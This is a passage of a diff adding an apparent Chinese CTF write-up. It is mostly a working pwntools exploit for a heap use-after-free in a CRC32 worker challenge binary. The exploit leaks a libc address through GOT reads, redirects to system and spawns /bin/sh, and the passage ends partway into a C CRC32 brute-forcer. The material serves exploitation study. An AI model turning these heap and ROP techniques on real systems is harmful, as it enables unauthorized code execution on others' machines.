+    <span class="n">cracksh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">crc32_to_bytes</span><span class="p">[</span><span class="n">crc32val</span><span class="p">]</span> <span class="o">=</span> <span class="n">ret</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">parse_addr</span><span class="p">(</span><span class="n">addr_str</span><span class="p">):</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">addr_str</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">4</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">addr_str</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">addr_str</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr_str</span><span class="p">)))</span>
+
+<span class="k">def</span> <span class="nf">request_crc32_comp</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Contents:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add_worker</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">heap_base_addr</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Starting Worker #"</span><span class="p">)</span>
+    <span class="n">worker_addr</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="n">worker_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">worker_addr</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">worker_addr</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="n">WORKER1_SIGN</span><span class="p">:</span>
+        <span class="n">heap_base_addr</span> <span class="o">=</span> <span class="n">worker_addr</span> <span class="o">-</span> <span class="n">WORKER1_ADDR</span>
+
+<span class="k">def</span> <span class="nf">yield_worker</span><span class="p">():</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">toggle_worker</span><span class="p">(</span><span class="n">worker_id</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"4</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Worker ID: #"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">worker_id</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gather_results</span><span class="p">():</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"5</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+
+<span class="c"># struct job {</span>
+<span class="c">#   unsigned int id;</span>
+<span class="c">#   unsigned int len = 4;</span>
+<span class="c">#   unsigned char *input = +0x10;</span>
+<span class="c">#   unsigned int *result = &amp;ebp of main context = heap + 0x34;</span>
+<span class="c"># bytes:</span>
+<span class="c">#   need to be crc32 to address of 2nd job chunk</span>
+<span class="k">def</span> <span class="nf">make_job1_payload</span><span class="p">(</span><span class="n">chunk_addr</span><span class="p">,</span> <span class="n">displacement</span><span class="p">):</span>
+    <span class="n">job_id</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c">#id, not useful</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c">#going to calculate 4 bytes</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">MAIN_EBP_ADDR</span> <span class="o">+</span> <span class="n">heap_base_addr</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">job_id</span> <span class="o">+</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">chunk_addr</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">result</span> <span class="o">+</span> \
+        <span class="p">(</span><span class="n">crack_crc32</span><span class="p">(</span><span class="n">JOB2_CONTENT_ADDR</span> <span class="o">+</span> <span class="n">heap_base_addr</span> <span class="o">+</span> <span class="n">displacement</span><span class="p">))</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">CHUNK_SIZE</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
+    <span class="k">assert</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">==</span> <span class="n">CHUNK_SIZE</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+
+<span class="c"># 2nd job content addr: 0x805b900</span>
+<span class="c"># 2nd job chunk size 0x100 = 128</span>
+<span class="c"># +0x00:</span>
+<span class="c">#   +0x10 ebp</span>
+<span class="c">#   0x8048520 puts addr</span>
+<span class="c">#   0x8048618 leave/ret addr</span>
+<span class="c">#   0x804A5E8 got addr of free</span>
+<span class="c"># +0x10:</span>
+<span class="c">#   +0x24 ebp</span>
+<span class="c">#   0x8048590 scanf addr</span>
+<span class="c">#   0x8048618 leave/ret addr</span>
+<span class="c">#   "%x" addr</span>
+<span class="c">#   +0x28 some position in this chunk</span>
+<span class="c"># +0x24:</span>
+<span class="c">#   0 ;ebp</span>
+<span class="c"># +0x28</span>
+<span class="c">#   0 ;to be modified</span>
+<span class="c">#   0</span>
+<span class="c">#   +0x34 "/bin/sh" addr</span>
+<span class="c"># +0x34:</span>
+<span class="c">#   "/bin/sh"</span>
+<span class="c"># +0x3c:</span>
+<span class="c">#   "%x\x00\x00"</span>
+<span class="c"># +0x40:</span>
+<span class="k">def</span> <span class="nf">make_job2_payload</span><span class="p">(</span><span class="n">chunk_addr</span><span class="p">):</span>
+    <span class="n">payload_size</span> <span class="o">=</span> <span class="mh">0x40</span>
+    <span class="n">length_begin</span> <span class="o">=</span> <span class="n">CHUNK_SIZE</span> <span class="o">-</span> <span class="n">payload_size</span>
+    <span class="n">leave_ret</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048618</span><span class="p">)</span>
+    <span class="n">payload_start</span> <span class="o">=</span> <span class="n">chunk_addr</span> <span class="o">+</span> <span class="n">length_begin</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">payload_start</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048520</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">leave_ret</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804A5E8</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">payload_start</span> <span class="o">+</span> <span class="mh">0x24</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048590</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">leave_ret</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">payload_start</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">payload_start</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">payload_start</span> <span class="o">+</span> <span class="mh">0x34</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">x</span><span class="se">\x00\x00</span><span class="s">"</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="n">length_begin</span> <span class="o">+</span> <span class="n">ret</span>
+    <span class="k">assert</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">==</span> <span class="n">CHUNK_SIZE</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ret</span><span class="p">,</span><span class="n">length_begin</span>
+
+<span class="n">add_worker</span><span class="p">()</span>
+<span class="n">add_worker</span><span class="p">()</span>
+
+
+<span class="n">job2_payload</span><span class="p">,</span> <span class="n">displacement</span> <span class="o">=</span> <span class="n">make_job2_payload</span><span class="p">(</span><span class="n">JOB2_CONTENT_ADDR</span> <span class="o">+</span> <span class="n">heap_base_addr</span><span class="p">)</span>
+<span class="n">job1_payload</span> <span class="o">=</span> <span class="n">make_job1_payload</span><span class="p">(</span><span class="n">JOB1_CONTENT_ADDR</span> <span class="o">+</span> <span class="n">heap_base_addr</span><span class="p">,</span> <span class="n">displacement</span><span class="p">)</span>
+<span class="n">request_crc32_comp</span><span class="p">(</span><span class="n">job1_payload</span><span class="p">)</span>
+<span class="n">request_crc32_comp</span><span class="p">(</span><span class="n">job2_payload</span><span class="p">)</span>
+
+<span class="n">yield_worker</span><span class="p">()</span>
+
+<span class="n">toggle_worker</span><span class="p">(</span><span class="n">WORKER2_ADDR</span> <span class="o">+</span> <span class="n">heap_base_addr</span><span class="p">)</span>
+
+<span class="n">yield_worker</span><span class="p">()</span>
+<span class="n">yield_worker</span><span class="p">()</span>
+
+<span class="n">gather_results</span><span class="p">()</span>
+
+<span class="n">request_crc32_comp</span><span class="p">(</span><span class="s">"C"</span> <span class="o">*</span> <span class="n">CHUNK_SIZE</span><span class="p">)</span>
+
+<span class="n">toggle_worker</span><span class="p">(</span><span class="n">WORKER2_ADDR</span> <span class="o">+</span> <span class="n">heap_base_addr</span><span class="p">)</span>
+
+<span class="n">yield_worker</span><span class="p">()</span>
+
+<span class="n">toggle_worker</span><span class="p">(</span><span class="n">WORKER2_ADDR</span> <span class="o">+</span> <span class="n">heap_base_addr</span><span class="p">)</span>
+
+<span class="c">#now job_stack is dangling pointer pointing to chunk in fastbin</span>
+
+<span class="n">request_crc32_comp</span><span class="p">(</span><span class="n">crack_crc32</span><span class="p">(</span><span class="n">JOB1_CONTENT_ADDR</span> <span class="o">+</span> <span class="n">heap_base_addr</span><span class="p">))</span>
+
+<span class="n">yield_worker</span><span class="p">()</span>
+<span class="n">yield_worker</span><span class="p">()</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Getting Job</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">got_info</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">free_addr</span> <span class="o">=</span> <span class="n">parse_addr</span><span class="p">(</span><span class="n">got_info</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">"free addr: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_addr</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="n">FREE_ADDR</span> <span class="o">+</span> <span class="n">SYSTEM_ADDR</span>
+<span class="k">print</span> <span class="s">"system addr: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>顺便提一下，在服务器的shell中直接python运行这个脚本的话，from pwn import *这里会卡死，不知道为什么，有大神知道的话，可以讨论一下。所以我说先python打开交互式界面，然后手动import我的exp，就可以getshell了。。。</p>
+
+<p>其中，crack_crc32是用来爆破crc32的程序，因为是爆破，所以exp的运行时间可能会有些长。代码如下：</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+</span><span class="k">static</span> <span class="kt">uint32_t</span> <span class="n">crc32_tab</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x77073096</span><span class="p">,</span> <span class="mh">0xee0e612c</span><span class="p">,</span> <span class="mh">0x990951ba</span><span class="p">,</span> <span class="mh">0x076dc419</span><span class="p">,</span> <span class="mh">0x706af48f</span><span class="p">,</span>
+  <span class="mh">0xe963a535</span><span class="p">,</span> <span class="mh">0x9e6495a3</span><span class="p">,</span> <span class="mh">0x0edb8832</span><span class="p">,</span> <span class="mh">0x79dcb8a4</span><span class="p">,</span> <span class="mh">0xe0d5e91e</span><span class="p">,</span> <span class="mh">0x97d2d988</span><span class="p">,</span>
+  <span class="mh">0x09b64c2b</span><span class="p">,</span> <span class="mh">0x7eb17cbd</span><span class="p">,</span> <span class="mh">0xe7b82d07</span><span class="p">,</span> <span class="mh">0x90bf1d91</span><span class="p">,</span> <span class="mh">0x1db71064</span><span class="p">,</span> <span class="mh">0x6ab020f2</span><span class="p">,</span>
+  <span class="mh">0xf3b97148</span><span class="p">,</span> <span class="mh">0x84be41de</span><span class="p">,</span> <span class="mh">0x1adad47d</span><span class="p">,</span> <span class="mh">0x6ddde4eb</span><span class="p">,</span> <span class="mh">0xf4d4b551</span><span class="p">,</span> <span class="mh">0x83d385c7</span><span class="p">,</span>
+  <span class="mh">0x136c9856</span><span class="p">,</span> <span class="mh">0x646ba8c0</span><span class="p">,</span> <span class="mh">0xfd62f97a</span><span class="p">,</span> <span class="mh">0x8a65c9ec</span><span class="p">,</span> <span class="mh">0x14015c4f</span><span class="p">,</span> <span class="mh">0x63066cd9</span><span class="p">,</span>
+  <span class="mh">0xfa0f3d63</span><span class="p">,</span> <span class="mh">0x8d080df5</span><span class="p">,</span> <span class="mh">0x3b6e20c8</span><span class="p">,</span> <span class="mh">0x4c69105e</span><span class="p">,</span> <span class="mh">0xd56041e4</span><span class="p">,</span> <span class="mh">0xa2677172</span><span class="p">,</span>
+  <span class="mh">0x3c03e4d1</span><span class="p">,</span> <span class="mh">0x4b04d447</span><span class="p">,</span> <span class="mh">0xd20d85fd</span><span class="p">,</span> <span class="mh">0xa50ab56b</span><span class="p">,</span> <span class="mh">0x35b5a8fa</span><span class="p">,</span> <span class="mh">0x42b2986c</span><span class="p">,</span>
+  <span class="mh">0xdbbbc9d6</span><span class="p">,</span> <span class="mh">0xacbcf940</span><span class="p">,</span> <span class="mh">0x32d86ce3</span><span class="p">,</span> <span class="mh">0x45df5c75</span><span class="p">,</span> <span class="mh">0xdcd60dcf</span><span class="p">,</span> <span class="mh">0xabd13d59</span><span class="p">,</span>
+  <span class="mh">0x26d930ac</span><span class="p">,</span> <span class="mh">0x51de003a</span><span class="p">,</span> <span class="mh">0xc8d75180</span><span class="p">,</span> <span class="mh">0xbfd06116</span><span class="p">,</span> <span class="mh">0x21b4f4b5</span><span class="p">,</span> <span class="mh">0x56b3c423</span><span class="p">,</span>
+  <span class="mh">0xcfba9599</span><span class="p">,</span> <span class="mh">0xb8bda50f</span><span class="p">,</span> <span class="mh">0x2802b89e</span><span class="p">,</span> <span class="mh">0x5f058808</span><span class="p">,</span> <span class="mh">0xc60cd9b2</span><span class="p">,</span> <span class="mh">0xb10be924</span><span class="p">,</span>
+  <span class="mh">0x2f6f7c87</span><span class="p">,</span> <span class="mh">0x58684c11</span><span class="p">,</span> <span class="mh">0xc1611dab</span><span class="p">,</span> <span class="mh">0xb6662d3d</span><span class="p">,</span> <span class="mh">0x76dc4190</span><span class="p">,</span> <span class="mh">0x01db7106</span><span class="p">,</span>
+  <span class="mh">0x98d220bc</span><span class="p">,</span> <span class="mh">0xefd5102a</span><span class="p">,</span> <span class="mh">0x71b18589</span><span class="p">,</span> <span class="mh">0x06b6b51f</span><span class="p">,</span> <span class="mh">0x9fbfe4a5</span><span class="p">,</span> <span class="mh">0xe8b8d433</span><span class="p">,</span>
+  <span class="mh">0x7807c9a2</span><span class="p">,</span> <span class="mh">0x0f00f934</span><span class="p">,</span> <span class="mh">0x9609a88e</span><span class="p">,</span> <span class="mh">0xe10e9818</span><span class="p">,</span> <span class="mh">0x7f6a0dbb</span><span class="p">,</span> <span class="mh">0x086d3d2d</span><span class="p">,</span>
+  <span class="mh">0x91646c97</span><span class="p">,</span> <span class="mh">0xe6635c01</span><span class="p">,</span> <span class="mh">0x6b6b51f4</span><span class="p">,</span> <span class="mh">0x1c6c6162</span><span class="p">,</span> <span class="mh">0x856530d8</span><span class="p">,</span> <span class="mh">0xf262004e</span><span class="p">,</span>
+  <span class="mh">0x6c0695ed</span><span class="p">,</span> <span class="mh">0x1b01a57b</span><span class="p">,</span> <span class="mh">0x8208f4c1</span><span class="p">,</span> <span class="mh">0xf50fc457</span><span class="p">,</span> <span class="mh">0x65b0d9c6</span><span class="p">,</span> <span class="mh">0x12b7e950</span><span class="p">,</span>
+  <span class="mh">0x8bbeb8ea</span><span class="p">,</span> <span class="mh">0xfcb9887c</span><span class="p">,</span> <span class="mh">0x62dd1ddf</span><span class="p">,</span> <span class="mh">0x15da2d49</span><span class="p">,</span> <span class="mh">0x8cd37cf3</span><span class="p">,</span> <span class="mh">0xfbd44c65</span><span class="p">,</span>
+  <span class="mh">0x4db26158</span><span class="p">,</span> <span class="mh">0x3ab551ce</span><span class="p">,</span> <span class="mh">0xa3bc0074</span><span class="p">,</span> <span class="mh">0xd4bb30e2</span><span class="p">,</span> <span class="mh">0x4adfa541</span><span class="p">,</span> <span class="mh">0x3dd895d7</span><span class="p">,</span>
+  <span class="mh">0xa4d1c46d</span><span class="p">,</span> <span class="mh">0xd3d6f4fb</span><span class="p">,</span> <span class="mh">0x4369e96a</span><span class="p">,</span> <span class="mh">0x346ed9fc</span><span class="p">,</span> <span class="mh">0xad678846</span><span class="p">,</span> <span class="mh">0xda60b8d0</span><span class="p">,</span>
+  <span class="mh">0x44042d73</span><span class="p">,</span> <span class="mh">0x33031de5</span><span class="p">,</span> <span class="mh">0xaa0a4c5f</span><span class="p">,</span> <span class="mh">0xdd0d7cc9</span><span class="p">,</span> <span class="mh">0x5005713c</span><span class="p">,</span> <span class="mh">0x270241aa</span><span class="p">,</span>
+  <span class="mh">0xbe0b1010</span><span class="p">,</span> <span class="mh">0xc90c2086</span><span class="p">,</span> <span class="mh">0x5768b525</span><span class="p">,</span> <span class="mh">0x206f85b3</span><span class="p">,</span> <span class="mh">0xb966d409</span><span class="p">,</span> <span class="mh">0xce61e49f</span><span class="p">,</span>
+  <span class="mh">0x5edef90e</span><span class="p">,</span> <span class="mh">0x29d9c998</span><span class="p">,</span> <span class="mh">0xb0d09822</span><span class="p">,</span> <span class="mh">0xc7d7a8b4</span><span class="p">,</span> <span class="mh">0x59b33d17</span><span class="p">,</span> <span class="mh">0x2eb40d81</span><span class="p">,</span>
+  <span class="mh">0xb7bd5c3b</span><span class="p">,</span> <span class="mh">0xc0ba6cad</span><span class="p">,</span> <span class="mh">0xedb88320</span><span class="p">,</span> <span class="mh">0x9abfb3b6</span><span class="p">,</span> <span class="mh">0x03b6e20c</span><span class="p">,</span> <span class="mh">0x74b1d29a</span><span class="p">,</span>
+  <span class="mh">0xead54739</span><span class="p">,</span> <span class="mh">0x9dd277af</span><span class="p">,</span> <span class="mh">0x04db2615</span><span class="p">,</span> <span class="mh">0x73dc1683</span><span class="p">,</span> <span class="mh">0xe3630b12</span><span class="p">,</span> <span class="mh">0x94643b84</span><span class="p">,</span>
+  <span class="mh">0x0d6d6a3e</span><span class="p">,</span> <span class="mh">0x7a6a5aa8</span><span class="p">,</span> <span class="mh">0xe40ecf0b</span><span class="p">,</span> <span class="mh">0x9309ff9d</span><span class="p">,</span> <span class="mh">0x0a00ae27</span><span class="p">,</span> <span class="mh">0x7d079eb1</span><span class="p">,</span>
+  <span class="mh">0xf00f9344</span><span class="p">,</span> <span class="mh">0x8708a3d2</span><span class="p">,</span> <span class="mh">0x1e01f268</span><span class="p">,</span> <span class="mh">0x6906c2fe</span><span class="p">,</span> <span class="mh">0xf762575d</span><span class="p">,</span> <span class="mh">0x806567cb</span><span class="p">,</span>
+  <span class="mh">0x196c3671</span><span class="p">,</span> <span class="mh">0x6e6b06e7</span><span class="p">,</span> <span class="mh">0xfed41b76</span><span class="p">,</span> <span class="mh">0x89d32be0</span><span class="p">,</span> <span class="mh">0x10da7a5a</span><span class="p">,</span> <span class="mh">0x67dd4acc</span><span class="p">,</span>
+  <span class="mh">0xf9b9df6f</span><span class="p">,</span> <span class="mh">0x8ebeeff9</span><span class="p">,</span> <span class="mh">0x17b7be43</span><span class="p">,</span> <span class="mh">0x60b08ed5</span><span class="p">,</span> <span class="mh">0xd6d6a3e8</span><span class="p">,</span> <span class="mh">0xa1d1937e</span><span class="p">,</span>
+  <span class="mh">0x38d8c2c4</span><span class="p">,</span> <span class="mh">0x4fdff252</span><span class="p">,</span> <span class="mh">0xd1bb67f1</span><span class="p">,</span> <span class="mh">0xa6bc5767</span><span class="p">,</span> <span class="mh">0x3fb506dd</span><span class="p">,</span> <span class="mh">0x48b2364b</span><span class="p">,</span>
+  <span class="mh">0xd80d2bda</span><span class="p">,</span> <span class="mh">0xaf0a1b4c</span><span class="p">,</span> <span class="mh">0x36034af6</span><span class="p">,</span> <span class="mh">0x41047a60</span><span class="p">,</span> <span class="mh">0xdf60efc3</span><span class="p">,</span> <span class="mh">0xa867df55</span><span class="p">,</span>
+  <span class="mh">0x316e8eef</span><span class="p">,</span> <span class="mh">0x4669be79</span><span class="p">,</span> <span class="mh">0xcb61b38c</span><span class="p">,</span> <span class="mh">0xbc66831a</span><span class="p">,</span> <span class="mh">0x256fd2a0</span><span class="p">,</span> <span class="mh">0x5268e236</span><span class="p">,</span>
+  <span class="mh">0xcc0c7795</span><span class="p">,</span> <span class="mh">0xbb0b4703</span><span class="p">,</span> <span class="mh">0x220216b9</span><span class="p">,</span> <span class="mh">0x5505262f</span><span class="p">,</span> <span class="mh">0xc5ba3bbe</span><span class="p">,</span> <span class="mh">0xb2bd0b28</span><span class="p">,</span>
+  <span class="mh">0x2bb45a92</span><span class="p">,</span> <span class="mh">0x5cb36a04</span><span class="p">,</span> <span class="mh">0xc2d7ffa7</span><span class="p">,</span> <span class="mh">0xb5d0cf31</span><span class="p">,</span> <span class="mh">0x2cd99e8b</span><span class="p">,</span> <span class="mh">0x5bdeae1d</span><span class="p">,</span>
+  <span class="mh">0x9b64c2b0</span><span class="p">,</span> <span class="mh">0xec63f226</span><span class="p">,</span> <span class="mh">0x756aa39c</span><span class="p">,</span> <span class="mh">0x026d930a</span><span class="p">,</span> <span class="mh">0x9c0906a9</span><span class="p">,</span> <span class="mh">0xeb0e363f</span><span class="p">,</span>
+  <span class="mh">0x72076785</span><span class="p">,</span> <span class="mh">0x05005713</span><span class="p">,</span> <span class="mh">0x95bf4a82</span><span class="p">,</span> <span class="mh">0xe2b87a14</span><span class="p">,</span> <span class="mh">0x7bb12bae</span><span class="p">,</span> <span class="mh">0x0cb61b38</span><span class="p">,</span>
+  <span class="mh">0x92d28e9b</span><span class="p">,</span> <span class="mh">0xe5d5be0d</span><span class="p">,</span> <span class="mh">0x7cdcefb7</span><span class="p">,</span> <span class="mh">0x0bdbdf21</span><span class="p">,</span> <span class="mh">0x86d3d2d4</span><span class="p">,</span> <span class="mh">0xf1d4e242</span><span class="p">,</span>
+  <span class="mh">0x68ddb3f8</span><span class="p">,</span> <span class="mh">0x1fda836e</span><span class="p">,</span> <span class="mh">0x81be16cd</span><span class="p">,</span> <span class="mh">0xf6b9265b</span><span class="p">,</span> <span class="mh">0x6fb077e1</span><span class="p">,</span> <span class="mh">0x18b74777</span><span class="p">,</span>
+  <span class="mh">0x88085ae6</span><span class="p">,</span> <span class="mh">0xff0f6a70</span><span class="p">,</span> <span class="mh">0x66063bca</span><span class="p">,</span> <span class="mh">0x11010b5c</span><span class="p">,</span> <span class="mh">0x8f659eff</span><span class="p">,</span> <span class="mh">0xf862ae69</span><span class="p">,</span>
+  <span class="mh">0x616bffd3</span><span class="p">,</span> <span class="mh">0x166ccf45</span><span class="p">,</span> <span class="mh">0xa00ae278</span><span class="p">,</span> <span class="mh">0xd70dd2ee</span><span class="p">,</span> <span class="mh">0x4e048354</span><span class="p">,</span> <span class="mh">0x3903b3c2</span><span class="p">,</span>
+  <span class="mh">0xa7672661</span><span class="p">,</span> <span class="mh">0xd06016f7</span><span class="p">,</span> <span class="mh">0x4969474d</span><span class="p">,</span> <span class="mh">0x3e6e77db</span><span class="p">,</span> <span class="mh">0xaed16a4a</span><span class="p">,</span> <span class="mh">0xd9d65adc</span><span class="p">,</span>
+  <span class="mh">0x40df0b66</span><span class="p">,</span> <span class="mh">0x37d83bf0</span><span class="p">,</span> <span class="mh">0xa9bcae53</span><span class="p">,</span> <span class="mh">0xdebb9ec5</span><span class="p">,</span> <span class="mh">0x47b2cf7f</span><span class="p">,</span> <span class="mh">0x30b5ffe9</span><span class="p">,</span>
+  <span class="mh">0xbdbdf21c</span><span class="p">,</span> <span class="mh">0xcabac28a</span><span class="p">,</span> <span class="mh">0x53b39330</span><span class="p">,</span> <span class="mh">0x24b4a3a6</span><span class="p">,</span> <span class="mh">0xbad03605</span><span class="p">,</span> <span class="mh">0xcdd70693</span><span class="p">,</span>
+  <span class="mh">0x54de5729</span><span class="p">,</span> <span class="mh">0x23d967bf</span><span class="p">,</span> <span class="mh">0xb3667a2e</span><span class="p">,</span> <span class="mh">0xc4614ab8</span><span class="p">,</span> <span class="mh">0x5d681b02</span><span class="p">,</span> <span class="mh">0x2a6f2b94</span><span class="p">,</span>
+  <span class="mh">0xb40bbe37</span><span class="p">,</span> <span class="mh">0xc30c8ea1</span><span class="p">,</span> <span class="mh">0x5a05df1b</span><span class="p">,</span> <span class="mh">0x2d02ef8d</span>
+<span class="p">};</span>
+
+<span class="kt">uint32_t</span> <span class="nf">crc32</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">crc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
